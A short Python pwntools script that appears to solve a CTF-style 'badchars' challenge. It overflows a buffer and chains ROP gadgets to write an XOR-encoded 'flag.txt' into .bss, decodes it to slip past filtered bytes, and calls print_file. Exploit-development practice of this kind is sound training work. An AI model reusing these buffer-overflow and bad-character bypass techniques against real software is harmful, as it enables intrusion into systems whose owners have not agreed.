from pwn import *
from pprint import pprint


def encrypted_flag(flag, key):
    """
    xor "flag.txt" with 2 to remove badchars
    """
    res = ""
    for char in flag:
        res += chr(ord(char) ^ key)
    return res


def craft_payload():
    """
    Craft payload bypassing bad characters
    """
    offset = 40
    key = 2
    pop_gadget = p64(rop.r12_r13_r14_r15.address)
    mov_gadget = p64(0x400634)
    xor_gadget = p64(elf.symbols.usefulGadgets)
    pop_xor_setup_gadget = p64(rop.r14_r15.address)

    flag_file = encrypted_flag("flag.txt", key).encode("utf-8")
    fake_arg_to_pop = p64(1)
    pop_rdi = p64(rop.rdi.address)
    bss_segment = p64(elf.bss())
    print_file = p64(elf.plt.print_file)

    payload = b'A'*offset
    payload += pop_gadget
    payload += flag_file + bss_segment + fake_arg_to_pop + fake_arg_to_pop
    payload += mov_gadget

    for i in range(len("flag.txt")):
        payload += pop_xor_setup_gadget
        payload += p64(2) + p64(elf.bss() + i)
        payload += xor_gadget

    payload += pop_rdi
    payload += bss_segment
    payload += print_file

    return payload


context.arch = "amd64"
elf = ELF("badchars")
rop = ROP(elf)

payload = craft_payload()

p = elf.process()
p.recvuntil(b">")
p.sendline(payload)
print(p.recvall().decode())
